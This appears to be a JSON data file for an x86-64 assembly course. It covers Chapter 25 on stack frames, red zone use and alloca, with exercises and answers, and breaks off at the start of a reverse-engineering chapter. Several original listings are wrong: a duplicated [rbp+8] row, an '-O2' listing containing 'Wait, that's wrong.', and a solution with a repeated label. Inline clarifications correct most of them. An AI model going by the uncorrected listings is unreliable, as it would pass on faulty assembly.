      "Functions with more than six arguments pass additional ones on the stack, accessed via positive offsets from rbp.",
      "Variable-length arrays and alloca require dynamic stack allocation with rsp adjustment."
    ],
    "diagramType": "stack_frames_prologues",
    "sections": [
      {
        "id": "sec-25-1",
        "title": "25.1 Review of Stack Frame Basics",
        "content": "When a function is called, the CPU pushes the return address onto the stack. The callee then typically saves the caller’s frame pointer (if using one) and sets up its own frame pointer. This creates a stack frame that contains:\n\n- Return address\n- Saved previous frame pointer (rbp)\n- Arguments passed on the stack (beyond the first six)\n- Local variables\n- Saved callee-saved registers (if any)\n\nThe frame pointer (rbp) points to the saved previous rbp, providing a fixed reference for accessing both arguments (positive offsets) and locals (negative offsets). The stack pointer (rsp) may change during the function (e.g., due to pushes/pops for temporary storage), so using rbp keeps access stable."
      },
      {
        "id": "sec-25-1-1",
        "title": "25.1.1 Typical Stack Frame Layout (with Frame Pointer)",
        "content": "\n\nClarification: The duplicated [rbp+8] row labeled sixth argument is incorrect: that slot contains only the return address. A spilled sixth register argument needs its own allocated slot, usually at a negative offset. The seventh integer argument is at [rbp+16].",
        "codeSnippets": [
          {
            "language": "text",
            "title": "25.1.1 Typical Stack Frame Layout (with Frame Pointer) — listing 1",
            "code": "        +------------------------+  Higher addresses\n        |       ...              |\n        | 7th argument (if any)  |  [rbp+16]\n        | 6th argument           |  [rbp+8]   (if spilled)\n        | Return Address         |  [rbp+8]   (actually return address is at [rbp+8])\n        | Saved RBP              |  [rbp]     <-- rbp points here\n        | Local variable 1       |  [rbp-8]\n        | Local variable 2       |  [rbp-16]\n        | ...                    |\n        | Saved callee-saved regs|  [rbp-...]\n        +------------------------+  Lower addresses (rsp after allocation)",
            "explanation": "Note: The return address is at [rbp+8] because call pushes it before the prologue. The first stack-passed argument (7th overall) is at [rbp+16] after the prologue (since push rbp places saved rbp at [rbp])."
          }
        ]
      },
      {
        "id": "sec-25-2",
        "title": "25.2 Standard Prologue and Epilogue with Frame Pointer",
        "content": "The most straightforward function prologue uses a frame pointer to create a stable stack frame."
      },
      {
        "id": "sec-25-2-1",
        "title": "25.2.1 Prologue",
        "content": "\n\nClarification: N being divisible by 16 assumes no additional pushes. Include every saved register and outgoing argument in the alignment calculation; padding must be established before a call, never repaired afterward.",
        "codeSnippets": [
          {
            "language": "nasm",
            "title": "25.2.1 Prologue — listing 1",
            "code": "push rbp          ; save caller's base pointer\nmov rbp, rsp      ; set our base pointer\nsub rsp, N        ; allocate N bytes for local variables",
            "explanation": "This sequence:\n- Saves the caller’s rbp on the stack.\n- Sets rbp to the current rsp, so rbp points to the saved old rbp.\n- Allocates space for locals by subtracting N from rsp. N should be a multiple of 16 to maintain alignment if the function calls other functions.\n\nAlignment consideration: At function entry, rsp is 8 mod 16 (because return address was pushed). After push rbp, rsp becomes 0 mod 16. If we subtract a multiple of 16, rsp remains 0 mod 16, which is correct for making calls (the call instruction will push 8 bytes, making it 8 mod 16 at callee entry, as expected). Therefore, N should be a multiple of 16. If you need an odd number of bytes for locals, round up to a multiple of 16 and use only the needed part, or adjust for alignment."
          }
        ]
      },
      {
        "id": "sec-25-2-2",
        "title": "25.2.2 Epilogue",
        "content": "",
        "codeSnippets": [
          {
            "language": "nasm",
            "title": "25.2.2 Epilogue — listing 1",
            "code": "mov rsp, rbp      ; deallocate locals (restore rsp to rbp)\npop rbp           ; restore caller's rbp\nret",
            "explanation": "Alternatively, use the leave instruction, which is equivalent to mov rsp, rbp followed by pop rbp. It is shorter but may be slower on some older CPUs (though on modern CPUs it is fine)."
          },
          {
            "language": "nasm",
            "title": "25.2.2 Epilogue — listing 2",
            "code": "leave\nret"
          }
        ]
      },
      {
        "id": "sec-25-2-3",
        "title": "25.2.3 Complete Example",
        "content": "",
        "codeSnippets": [
          {
            "language": "nasm",
            "title": "Function: add_two",
            "code": "; Function: add_two\n; Inputs: rdi = a, rsi = b\n; Output: rax = a + b\nadd_two:\n    push rbp\n    mov rbp, rsp\n    sub rsp, 16          ; allocate 16 bytes for two locals (unused here)\n\n    ; Body: could use locals at [rbp-8] and [rbp-16]\n    mov rax, rdi\n    add rax, rsi\n\n    ; Epilogue\n    mov rsp, rbp\n    pop rbp\n    ret",
            "explanation": "Even though locals aren't used, the prologue/epilogue are often present for consistency or debugging. Optimized code will omit unnecessary stack operations."
          }
        ]
      },
      {
        "id": "sec-25-3",
        "title": "25.3 Frame Pointer Omission and Optimized Code",
        "content": "Modern compilers often omit the frame pointer (-fomit-frame-pointer) to free rbp as a general-purpose register. This is default at -O1 and higher on x86-64. Without a frame pointer, the function uses rsp-relative addressing for all locals and stack arguments. The challenge is that rsp may change during the function (e.g., due to pushes for register saves or alloca). To handle this, the compiler ensures that rsp is stable within the body or adjusts offsets accordingly."
      },
      {
        "id": "sec-25-3-1",
        "title": "25.3.1 Characteristics of Frame Pointer Omission",
        "content": "- rbp is free for general use, increasing available registers.\n- Prologue typically just sub rsp, N (no push rbp/mov rbp, rsp).\n- Locals are accessed as [rsp+offset] (positive offsets after the initial sub).\n- Stack arguments (beyond six) are at [rsp+N+8] after prologue (since return address at [rsp] before sub, after sub it moves to [rsp+N], and the first stack arg is at [rsp+N+8]).\n- If the function pushes registers (e.g., callee-saved), the offsets shift; the compiler tracks this."
      },
      {
        "id": "sec-25-3-2",
        "title": "25.3.2 Example: Simple Function Without Frame Pointer",
        "content": "",
        "codeSnippets": [
          {
            "language": "nasm",
            "title": "Function: add_two (no frame pointer)",
            "code": "; Function: add_two (no frame pointer)\nadd_two:\n    sub rsp, 8          ; allocate 8 bytes (for alignment or local)\n    mov rax, rdi\n    add rax, rsi\n    add rsp, 8          ; deallocate\n    ret",
            "explanation": "If no locals are needed, the function can be just:"
          },
          {
            "language": "nasm",
            "title": "25.3.2 Example: Simple Function Without Frame Pointer — listing 2",
            "code": "add_two:\n    lea rax, [rdi+rsi]\n    ret",
            "explanation": "No stack operations at all."
          }
        ]
      },
      {
        "id": "sec-25-3-3",
        "title": "25.3.3 Pros and Cons",
        "content": "Advantages:\n- One extra register (rbp) for use.\n- Smaller prologue/epilogue (no push/pop).\n- Often faster due to fewer instructions.\n\nDisadvantages:\n- Debugging is harder because variable locations change with rsp and are not stable.\n- Stack unwinding (for exceptions or backtraces) requires additional metadata (DWARF CFI) to locate frames; the debugger uses this instead of rbp.\n- If the function uses alloca or variable-length arrays, frame pointer omission is more complex, but compilers handle it with CFI.\n\nClarification: Dynamic allocations often cause the compiler to retain a frame pointer even with frame-pointer omission enabled. CFI describes unwind state; it does not itself provide a stable addressing register."
      },
      {
        "id": "sec-25-4",
        "title": "25.4 Leaf Functions and the Red Zone",
        "content": "A leaf function is one that does not call any other functions. The System V AMD64 ABI defines a red zone: the 128 bytes immediately below rsp that are reserved for use by leaf functions without adjusting rsp. This allows leaf functions to store small amounts of data on the stack without the overhead of sub rsp/add rsp."
      },
      {
        "id": "sec-25-4-1",
        "title": "25.4.1 Rules for Red Zone",
        "content": "- The red zone extends from [rsp-128] to [rsp-1].\n- It is safe to use only if the function does not call other functions (because a call would push the return address and clobber the red zone).\n- Signal handlers must not use the red zone (they use their own stack), but this is guaranteed by the kernel.\n- The red zone is not available if the function uses alloca or dynamically adjusts the stack in a way that makes rsp point into the red zone.\n\nClarification: The protection concerns the interrupted function’s red zone: signal delivery preserves it. A user-space signal-handler function can use its own red zone under the same ABI. The red zone is relative to the current RSP and can hold temporaries in a non-leaf only when they are dead before a call. Windows and kernel interrupt contexts differ."
      },
      {
        "id": "sec-25-4-2",
        "title": "25.4.2 Example: Leaf Function Using Red Zone",
        "content": "",
        "codeSnippets": [
          {
            "language": "nasm",
            "title": "Function that stores two locals in red zone",
            "code": "; Function that stores two locals in red zone\nmy_leaf:\n    mov [rsp-8], rdi    ; local1\n    mov [rsp-16], rsi   ; local2\n    ; ... use [rsp-8] and [rsp-16] ...\n    ret",
            "explanation": "No sub rsp needed. This saves instructions and avoids potential alignment issues.\n\nNote: If the function calls another function, the call will push the return address at [rsp-8], overwriting the red zone area. Therefore, the red zone cannot be used across calls."
          }
        ]
      },
      {
        "id": "sec-25-5",
        "title": "25.5 Stack Frame for Functions with Many Arguments",
        "content": "When a function has more than six integer arguments, the extra arguments are passed on the stack. The caller pushes them in reverse order (right-to-left) before the call. At function entry, the stack layout (from top, i.e., rsp after call) is:\n\nClarification: The caller may reserve outgoing argument space and store arguments, rather than literally pushing them. These layouts assume scalar integer/pointer arguments, not arbitrary floating-point or aggregate signatures.",
        "codeSnippets": [
          {
            "language": "text",
            "title": "25.5 Stack Frame for Functions with Many Arguments — listing 1",
            "code": "[rsp]      = return address\n[rsp+8]    = 7th argument\n[rsp+16]   = 8th argument\n...",
            "explanation": "After the standard prologue (push rbp; mov rbp, rsp; sub rsp, N), the offsets relative to rbp are:"
          },
          {
            "language": "text",
            "title": "25.5 Stack Frame for Functions with Many Arguments — listing 2",
            "code": "[rbp]      = saved old rbp\n[rbp+8]    = return address\n[rbp+16]   = 7th argument\n[rbp+24]   = 8th argument\n...",
            "explanation": "The function can access these using [rbp+16], [rbp+24], etc."
          }
        ]
      },
      {
        "id": "sec-25-5-1",
        "title": "25.5.1 Example: Function with Seven Arguments",
        "content": "",
        "codeSnippets": [
          {
            "language": "nasm",
            "title": "sum_seven: first six in rdi..r9, 7th on stack",
            "code": "; sum_seven: first six in rdi..r9, 7th on stack\nsum_seven:\n    push rbp\n    mov rbp, rsp\n    ; 7th arg at [rbp+16]\n    add rdi, rsi\n    add rdi, rdx\n    add rdi, rcx\n    add rdi, r8\n    add rdi, r9\n    mov rax, [rbp+16]   ; load 7th arg\n    add rdi, rax\n    mov rax, rdi\n    mov rsp, rbp\n    pop rbp\n    ret",
            "explanation": "Caller:"
          },
          {
            "language": "nasm",
            "title": "25.5.1 Example: Function with Seven Arguments — listing 2",
            "code": "    ; set rdi..r9\n    push 7              ; push 7th argument (value 7)\n    call sum_seven\n    add rsp, 8          ; cleanup stack",
            "explanation": "Alignment: The caller must ensure that before call, rsp is 16-byte aligned. If it pushes an odd number of arguments, it may need to adjust (sub rsp, 8 before pushes or after cleanup) to maintain alignment."
          }
        ]
      },
      {
        "id": "sec-25-5-2",
        "title": "25.5.2 Without Frame Pointer",
        "content": "If frame pointer omitted, the function might do:",
        "codeSnippets": [
          {
            "language": "nasm",
            "title": "25.5.2 Without Frame Pointer — listing 1",
            "code": "sum_seven:\n    sub rsp, 8          ; alignment or local\n    ; 7th arg is now at [rsp+8+8] = [rsp+16] after sub? Let's compute:\n    ; At entry: [rsp] = return addr, [rsp+8] = 7th arg.\n    ; After sub rsp,8: return addr at [rsp+8], 7th arg at [rsp+16].\n    ; So access [rsp+16].\n    ...\n    add rsp, 8\n    ret",
            "explanation": "This is why frame pointer makes argument access clearer."
          }
        ]
      },
      {
        "id": "sec-25-6",
        "title": "25.6 Compiler-Generated Stack Frames",
        "content": "When compiling C/C++, the compiler generates prologues and epilogues according to optimization level and function properties. Reading these in disassembly helps understand the function’s local variables and arguments."
      },
      {
        "id": "sec-25-6-1",
        "title": "25.6.1 At -O0 (No Optimization)",
        "content": "Almost every function uses frame pointer:",
        "codeSnippets": [
          {
            "language": "text",
            "title": "25.6.1 At -O0 (No Optimization) — listing 1",
            "code": "push rbp\nmov rbp, rsp\nsub rsp, <size>\n... body ...\nmov rsp, rbp\npop rbp\nret",
            "explanation": "Locals are accessed as [rbp-N], arguments as [rbp+8+...] (return address at [rbp+8], first stack arg at [rbp+16])."
          }
        ]
      },
      {
        "id": "sec-25-6-2",
        "title": "25.6.2 At -O2 (Optimized)",
        "content": "Many functions omit frame pointer:",
        "codeSnippets": [
          {
            "language": "text",
            "title": "25.6.2 At -O2 (Optimized) — listing 1",
            "code": "sub rsp, <size>\n... body using [rsp+offset] ...\nadd rsp, <size>\nret",
            "explanation": "Or no stack at all if no locals and no spills.\n\nRegisters are used aggressively; locals that don't fit are spilled to stack. The compiler uses DWARF CFI to enable unwinding without frame pointer."
          }
        ]
      },
      {
        "id": "sec-25-6-3",
        "title": "25.6.3 Example: C Function with Locals",
        "content": "C code:\n\nClarification: The -O0 example uses the red zone after saving RBP. The original -O2 listing includes an editing comment disguised as an instruction; the corrected instruction sequence below computes a+b+a*b. C inputs must avoid signed overflow.",
        "codeSnippets": [
          {
            "language": "c",
            "title": "25.6.3 Example: C Function with Locals — listing 1",
            "code": "int compute(int a, int b) {\n    int c = a + b;\n    int d = a * b;\n    return c + d;\n}",
            "explanation": "Compile with -O0 -masm=intel -S:"
          },
          {
            "language": "text",
            "title": "25.6.3 Example: C Function with Locals — listing 2",
            "code": "compute:\n    push rbp\n    mov rbp, rsp\n    mov DWORD PTR [rbp-20], edi   ; a\n    mov DWORD PTR [rbp-24], esi   ; b\n    mov edx, DWORD PTR [rbp-20]\n    mov eax, DWORD PTR [rbp-24]\n    add eax, edx                   ; c = a+b\n    mov DWORD PTR [rbp-4], eax\n    mov edx, DWORD PTR [rbp-20]\n    mov eax, DWORD PTR [rbp-24]\n    imul eax, edx                  ; d = a*b\n    mov DWORD PTR [rbp-8], eax\n    mov edx, DWORD PTR [rbp-4]\n    mov eax, DWORD PTR [rbp-8]\n    add eax, edx                   ; return c+d\n    pop rbp\n    ret",
            "explanation": "Here locals c at [rbp-4], d at [rbp-8], and args a at [rbp-20], b at [rbp-24]. The compiler spilled everything to stack for clarity.\n\nCompile with -O2:"
          },
          {
            "language": "text",
            "title": "25.6.3 Example: C Function with Locals — listing 3",
            "code": "compute:\n    lea eax, [rdi+rsi]   ; c = a+b\n    add eax, edi\n    add eax, esi? Wait, that's wrong. Actually:\n    ; compute: c = a+b, d = a*b, return c+d = (a+b)+(a*b)\n    lea eax, [rdi+rsi]\n    imul edi, esi\n    add eax, edi\n    ret",
            "explanation": "The compiler optimized directly, no stack.\n\nThis illustrates the dramatic difference."
          },
          {
            "language": "nasm",
            "title": "Corrected optimized compute",
            "code": "compute:\n    lea eax,[rdi+rsi]\n    imul edi,esi\n    add eax,edi\n    ret",
            "explanation": "Only EAX and EDI are modified; no frame is necessary."
          }
        ]
      },
      {
        "id": "sec-25-7",
        "title": "25.7 Reading Prologues and Epilogues in Disassembly",
        "content": "To identify a function’s stack frame in disassembly:\n\n1. Look for push rbp; mov rbp, rsp at function start → indicates frame pointer used.\n2. Look for sub rsp, N to allocate locals.\n3. Look for mov [rbp-...], reg to store local variables; mov [rbp+...] to access stack arguments.\n4. At the end, leave or mov rsp, rbp; pop rbp; ret indicates epilogue.\n5. For frame pointer omission, look for sub rsp, N at entry and add rsp, N before ret, with locals at [rsp+offset].\n\nIn GDB, info frame shows the current frame, including saved registers and argument locations, using debug info."
      },
      {
        "id": "sec-25-8",
        "title": "25.8 Special Cases: alloca and Variable-Length Arrays",
        "content": "alloca (or VLA in C) allocates memory on the stack whose size is determined at runtime. This requires dynamic adjustment of rsp. The frame pointer is very helpful here because after dynamic allocation, rsp changes unpredictably, but rbp remains fixed."
      },
      {
        "id": "sec-25-8-1",
        "title": "25.8.1 Example: Using alloca-like Allocation",
        "content": "\n\nClarification: The source does not actually round N despite its comment. Check size and arithmetic before allocation. alloca storage lasts until function return; a VLA normally lasts until its block exits. Neither provides recoverable allocation failure like malloc.",
        "codeSnippets": [
          {
            "language": "nasm",
            "title": "Function that allocates N bytes on stack (N in rdi)",
            "code": "; Function that allocates N bytes on stack (N in rdi)\ndynamic_alloc:\n    push rbp\n    mov rbp, rsp\n    sub rsp, rdi        ; allocate N bytes (rounded up for alignment)\n    ; use space at [rsp] ... but rsp may not be aligned; adjust if needed\n    ; ...\n    mov rsp, rbp        ; deallocate all at once\n    pop rbp\n    ret",
            "explanation": "If the function calls other functions, you must ensure alignment after the dynamic allocation (e.g., round rdi up to multiple of 16). With frame pointer, you can still access locals at fixed offsets relative to rbp.\n\nWithout frame pointer, dynamic allocation is trickier because rsp changes; the compiler often uses a frame pointer in such functions even at -O2."
          }
        ]
      },
      {
        "id": "sec-25-9",
        "title": "25.9 Practical Examples",
        "content": ""
      },
      {
        "id": "sec-25-9-1",
        "title": "25.9.1 Analyzing a Simple Function with GDB",
        "content": "Compile a C function with -O0 -g, load in GDB, break at function, and examine stack frame:",
        "codeSnippets": [
          {
            "language": "gdb",
            "title": "25.9.1 Analyzing a Simple Function with GDB — listing 1",
            "code": "break myfunc\nrun\ninfo frame\ninfo args\ninfo locals\nx/8gx $rbp",
            "explanation": "info frame shows saved registers and frame layout based on CFI."
          }
        ]
      },
      {
        "id": "sec-25-9-2",
        "title": "25.9.2 Writing a Function with Stack Args and Locals",
        "content": "We'll write a function that takes seven arguments (six in regs, one on stack) and uses two local variables, demonstrating both positive and negative offsets from rbp.\n\nClarification: Only the first two arguments are stored into locals, despite the source comment saying first six. The result is a+b+c+d+e+f+g+a+b. The local additions use dword operands because the destination is EAX.",
        "codeSnippets": [
          {
            "language": "nasm",
            "title": "25.9.2 Writing a Function with Stack Args and Locals — listing 1",
            "code": "section .text\nglobal my_func\n\n; int my_func(int a, int b, int c, int d, int e, int f, int g)\n; returns sum of all plus local-based adjustments\nmy_func:\n    push rbp\n    mov rbp, rsp\n    sub rsp, 16          ; two locals: [rbp-8] and [rbp-16]\n\n    ; store first six regs into locals for demonstration\n    mov [rbp-8], rdi     ; local1 = a\n    mov [rbp-16], rsi    ; local2 = b\n\n    ; compute sum of first six\n    mov eax, edi\n    add eax, esi\n    add eax, edx\n    add eax, ecx\n    add eax, r8d\n    add eax, r9d\n\n    ; add 7th arg from stack: [rbp+16]\n    add eax, dword [rbp+16]\n\n    ; add locals\n    add eax, [rbp-8]\n    add eax, [rbp-16]\n\n    mov rsp, rbp\n    pop rbp\n    ret",
            "explanation": "Caller pushes 7th arg (e.g., 7) and calls."
          },
          {
            "language": "nasm",
            "title": "Original source: Solution 25.1",
            "code": "sum:\n    push rbp\n    mov rbp, rsp\n    sub rsp, 16\n    mov [rbp-8], rdi   ; local1\n    mov [rbp-16], rsi  ; local2\n    mov rax, [rbp-8]\n    add rax, [rbp-16]\n    mov rsp, rbp\n    pop rbp\n    ret\n\nsum:\n    sub rsp, 16\n    mov [rsp], rdi\n    mov [rsp+8], rsi\n    mov rax, [rsp]\n    add rax, [rsp+8]\n    add rsp, 16\n    ret",
            "explanation": "Original source Solution 25.1; see the complete exercise version for separate labels, caller alignment, or bounded allocation."
          },
          {
            "language": "nasm",
            "title": "Original source: Solution 25.3",
            "code": "section .text\nglobal sum_nine\n\nsum_nine:\n    push rbp\n    mov rbp, rsp\n    ; first six in edi, esi, edx, ecx, r8d, r9d\n    add edi, esi\n    add edi, edx\n    add edi, ecx\n    add edi, r8d\n    add edi, r9d\n    ; last three at [rbp+16], [rbp+24], [rbp+32]\n    add edi, dword [rbp+16]\n    add edi, dword [rbp+24]\n    add edi, dword [rbp+32]\n    mov eax, edi\n    mov rsp, rbp\n    pop rbp\n    ret\n\n    ; set regs\n    push 9\n    push 8\n    push 7\n    call sum_nine\n    add rsp, 24",
            "explanation": "Original source Solution 25.3; see the complete exercise version for separate labels, caller alignment, or bounded allocation."
          },
          {
            "language": "nasm",
            "title": "Original source: Solution 25.5",
            "code": "dynamic_func:\n    push rbp\n    mov rbp, rsp\n    sub rsp, rdi        ; allocate size in rdi (assume multiple of 16)\n    ; use [rsp] as buffer\n    ; ...\n    mov rsp, rbp\n    pop rbp\n    ret",
            "explanation": "Original source Solution 25.5; see the complete exercise version for separate labels, caller alignment, or bounded allocation."
          }
        ]
      }
    ],
    "exercises": [
      {
        "id": "ex-25-1",
        "title": "Exercise 25.1: Frame Pointer Analysis",
        "description": "Write a simple function that takes two integers and returns their sum, using a frame pointer and two local variables. Show the prologue and epilogue. Then remove the frame pointer and show the equivalent.",
        "solution": "section .text\nglobal sum_frame, sum_no_frame\nsum_frame:\n    push rbp\n    mov rbp, rsp\n    sub rsp, 16\n    mov [rbp-8], rdi   ; local1\n    mov [rbp-16], rsi  ; local2\n    mov rax, [rbp-8]\n    add rax, [rbp-16]\n    mov rsp, rbp\n    pop rbp\n    ret\n\nsum_no_frame:\n    sub rsp, 16\n    mov [rsp], rdi\n    mov [rsp+8], rsi\n    mov rax, [rsp]\n    add rax, [rsp+8]\n    add rsp, 16\n    ret",
        "solutionLanguage": "nasm",
        "solutionExplanation": "Frame pointer version:\n\nNo frame pointer: These distinct labels can coexist in one NASM object. Both operate on 64-bit values. The no-frame version is a leaf; its 16-byte allocation need not align a nested call because it makes none."
      },
      {
        "id": "ex-25-2",
        "title": "Exercise 25.2: Red Zone Usage",
        "description": "Write a leaf function that stores four 64-bit values in the red zone and returns their sum. Ensure no sub rsp is used. Explain why it is safe.",
        "solution": "section .text\nglobal leaf_sum\nleaf_sum:\n    mov [rsp-8], rdi\n    mov [rsp-16], rsi\n    mov [rsp-24], rdx\n    mov [rsp-32], rcx\n    mov rax, [rsp-8]\n    add rax, [rsp-16]\n    add rax, [rsp-24]\n    add rax, [rsp-32]\n    ret",
        "solutionLanguage": "nasm",
        "solutionExplanation": "Safe because no calls are made; red zone is below rsp."
      },
      {
        "id": "ex-25-3",
        "title": "Exercise 25.3: Stack Arguments",
        "description": "Implement a function sum_nine that takes nine integer arguments: first six in registers, last three on stack. Return the sum. Include proper stack cleanup in the caller.",
        "solution": "section .text\nglobal sum_nine\n\nsum_nine:\n    push rbp\n    mov rbp, rsp\n    ; first six in edi, esi, edx, ecx, r8d, r9d\n    add edi, esi\n    add edi, edx\n    add edi, ecx\n    add edi, r8d\n    add edi, r9d\n    ; last three at [rbp+16], [rbp+24], [rbp+32]\n    add edi, dword [rbp+16]\n    add edi, dword [rbp+24]\n    add edi, dword [rbp+32]\n    mov eax, edi\n    mov rsp, rbp\n    pop rbp\n    ret\n\n\n; Complete Linux process-entry caller, initially RSP aligned to 16.\nglobal _start\n_start:\n    sub rsp,8              ; padding belongs above the arguments\n    push 9\n    push 8\n    push 7\n    mov edi,1\n    mov esi,2\n    mov edx,3\n    mov ecx,4\n    mov r8d,5\n    mov r9d,6\n    call sum_nine\n    add rsp,32             ; three arguments plus padding\n    mov edi,eax\n    mov eax,60\n    syscall\n",
        "solutionLanguage": "nasm",
        "solutionExplanation": "Caller: Assemble/link as a Linux executable; expected exit status 45. This caller starts at _start, not a normal function entry. Its total 32-byte allocation preserves call alignment."
      },
      {
        "id": "ex-25-4",
        "title": "Exercise 25.4: Compiler Output",
        "description": "Write a C function with several local variables and a loop. Compile with -O0 and -O2. Disassemble and identify the stack frame differences. Note which variables are in registers vs stack.",
        "solution": "// gcc -O0 -g -c locals.c -o locals-O0.o\n// gcc -O2 -g -c locals.c -o locals-O2.o\n// objdump -d -M intel locals-O0.o\n// objdump -d -M intel locals-O2.o\nunsigned compute_locals(unsigned n) {\n    unsigned sum=0, odd=1, last=0;\n    for (unsigned i=0;i<n;i++) {\n        last=odd;\n        sum+=last;\n        odd+=2;\n    }\n    return sum;\n}",
        "solutionLanguage": "c",
        "solutionExplanation": "Write C code, compile, disassemble. Note -O0 uses rbp, spills locals; -O2 may not touch stack at all or only sub rsp for alignment. For n=0,1,10 the results are 0,1,100. Unsigned arithmetic wraps predictably. Source locals need not have separate storage at -O2; track induction values and the return result instead."
      },
      {
        "id": "ex-25-5",
        "title": "Exercise 25.5: Dynamic Allocation",
        "description": "Write a function that allocates a variable amount of stack space (simulate alloca) and uses it to store values, then returns. Use a frame pointer. Ensure alignment if calling other functions.",
        "solution": "; uint64_t dynamic_func(size_t n); accepts 0..256 bytes.\n; Returns n after storing byte 1 in every requested byte, or -1 if n>256.\nsection .text\nglobal dynamic_func\ndynamic_func:\n    cmp rdi,256\n    ja .bad\n    push rbp\n    mov rbp,rsp\n    mov rax,rdi\n    add rax,15             ; safe after bounding n\n    and rax,-16\n    sub rsp,rax\n    xor ecx,ecx\n.fill:\n    cmp rcx,rdi\n    jae .filled\n    mov byte [rsp+rcx],1\n    inc rcx\n    jmp .fill\n.filled:\n    mov rsi,rdi            ; length\n    mov rdi,rsp            ; buffer\n    call count_bytes       ; RSP is aligned before CALL\n    mov rsp,rbp\n    pop rbp\n    ret\n.bad:\n    mov rax,-1\n    ret\ncount_bytes:\n    xor eax,eax\n    xor ecx,ecx\n.loop:\n    cmp rcx,rsi\n    jae .done\n    movzx edx,byte [rdi+rcx]\n    add rax,rdx\n    inc rcx\n    jmp .loop\n.done:\n    ret",
        "solutionLanguage": "nasm",
        "solutionExplanation": " Bounded allocation avoids rounding overflow and unbounded stack growth. The helper validates stored bytes through their sum; zero length never dereferences the buffer. No pointer escapes the function."
      }
    ],
    "practiceQuestions": [
      {
        "question": "What is a stack frame? What are its components?",
        "answer": "A stack frame holds invocation-specific state: return address, any saved frame pointer and registers, locals, spills and incoming/outgoing stack arguments. Exact layout follows the ABI and generated code."
      },
      {
        "question": "Show the standard prologue and epilogue for a function using a frame pointer.",
        "answer": "push rbp; mov rbp,rsp; sub rsp,N establishes a frame. mov rsp,rbp; pop rbp; ret tears it down. Restore other saved registers before discarding their slots. With only push rbp before allocation, use N divisible by 16 before nested calls."
      },
      {
        "question": "What is the red zone? When can you use it?",
        "answer": "The SysV AMD64 user-space red zone is the 128 bytes below current RSP protected from signal/interrupt delivery. Temporaries there must not survive a call. Windows x64 has no such red zone, and kernel code must not assume it."
      },
      {
        "question": "How does frame pointer omission affect local variable access?",
        "answer": "Locals use offsets from RSP or another compiler-chosen base. Every push, pop or allocation changes those offsets; unwind information can describe how to recover caller state without RBP."
      },
      {
        "question": "How are extra arguments beyond six passed to a function? Where are they located relative to rbp?",
        "answer": "For ordinary integer/pointer arguments, the seventh, eighth and ninth arrive at RSP+8,+16,+24. After push rbp; mov rbp,rsp they are at RBP+16,+24,+32. The caller releases their stack storage."
      },
      {
        "question": "Why is alignment important when allocating stack space? How do you maintain it?",
        "answer": "The baseline SysV ABI requires RSP divisible by 16 immediately before CALL, so a callee enters at 8 modulo 16. Track all pushes and allocations together; insert padding before stack arguments so the first argument remains adjacent to the return address."
      },
      {
        "question": "What is leave equivalent to? Is it always used?",
        "answer": "In ordinary 64-bit code, leave performs mov rsp,rbp followed by pop rbp. Functions may use the separate instructions, an RSP adjustment, or no frame teardown depending on their layout."
      },
      {
        "question": "How does a compiler decide whether to use a frame pointer? What factors influence this?",
        "answer": "Optimization settings, debug/profiling needs, dynamic allocations, stack realignment and target ABI affect the choice. A frame pointer may remain at -O2 when it simplifies addressing or unwinding."
      },
      {
        "question": "How do you handle variable-length stack allocation? Why is a frame pointer helpful?",
        "answer": "Validate a bounded size, round it up with overflow checks, reserve aligned space, and restore RSP from a stable saved value before return. RBP provides that stable reference. Large allocations need stack probing; stack-backed pointers must not escape their lifetime."
      },
      {
        "question": "In disassembly, how can you identify a function that uses the red zone? What are the clues?",
        "answer": "A leaf may store at negative RSP offsets without subtracting RSP, then return with RSP unchanged. Check that accesses stay within 128 bytes and do not overlap live caller data; the absence of calls alone does not prove red-zone use."
      }
    ],
    "summary": [
      "Stack frames provide a structured way to manage function state.",
      "Standard prologue: push rbp; mov rbp, rsp; sub rsp, N. Epilogue: mov rsp, rbp; pop rbp; ret or leave; ret.",
      "Frame pointer omission frees rbp but requires careful rsp-relative addressing.",
      "Leaf functions can use the 128-byte red zone to avoid stack pointer adjustments.",
      "Functions with more than six arguments receive extra args on the stack; access via [rbp+16] onward.",
      "Compilers vary prologue/epilogue based on optimization; reading disassembly requires understanding these patterns.",
      "Dynamic stack allocation (alloca) works best with a frame pointer.",
      "In the next chapter, we'll explore reverse engineering fundamentals, applying these skills to understand unknown binaries."
    ]
  },
  {
    "id": 26,
    "slug": "chapter-26-reverse-engineering-fundamentals",
    "level": 5,
    "levelTitle": "Low-Level Systems and Reverse Engineering",
    "title": "Chapter 26: Reverse Engineering Fundamentals",
    "subtitle": "Static & Dynamic Triage, Symbol Stripping, Control Flow Graphs, and Ghidra/radare2",
    "learningObjectives": [
      "Define reverse engineering and understand its legitimate uses and ethical considerations.",
      "Set up a reverse engineering environment with appropriate tools.",
      "Perform static analysis of binaries: file identification, string extraction, symbol inspection, and disassembly.",
      "Perform dynamic analysis: running under a debugger, setting breakpoints, tracing execution, and monitoring system calls.",
      "Recognize common high-level constructs translated to assembly (if‑else, loops, switch, functions, data structures).",
      "Reconstruct data structures and control flow from disassembled code.",
      "Identify compiler optimizations and strip debug info; handle stripped binaries.",
      "Apply a systematic methodology to analyze unknown binaries.",
      "Use Ghidra or radare2 as a high-level reverse engineering framework (introduction)."
    ],
    "prerequisites": [
      "Solid understanding of x86-64 assembly, registers, and memory addressing (Chapters 1–13).",
      "Familiarity with stack frames, calling conventions, and ABI details (Chapters 10, 19, 25).",
      "Proficiency in reading disassembly and compiler-generated assembly (Chapter 24).",
      "Knowledge of executable formats ELF/PE (Chapter 23).",
      "Experience with debugging tools like GDB (Chapter 17).",
      "Basic understanding of system calls and OS interaction (Chapter 16)."
    ],
    "keyConcepts": [
      "Reverse engineering is the process of analyzing a system to understand its design, functionality, or behavior.",
      "Static analysis examines a binary without executing it (disassembly, strings, headers).",
      "Dynamic analysis executes the binary in a controlled environment (debugger, sandbox) to observe its behavior.",
      "Stripped binaries lack symbol tables; the analyst must infer function boundaries and variable names.",
      "Control flow graphs (CFG) visually represent basic blocks and branches, aiding comprehension.",
      "Data structure reconstruction involves recognizing memory layouts and access patterns (arrays, structs, linked lists).",
      "Decompilers (e.g., Ghidra, IDA) attempt to produce C-like pseudocode from machine code.",
      "Legal and ethical aspects: reverse engineering may be restricted by licenses, laws, and terms; always obtain proper authorization."
    ],
    "diagramType": "reverse_engineering",
    "sections": [
      {
        "id": "sec-26-1",
        "title": "26.1 Introduction to Reverse Engineering",
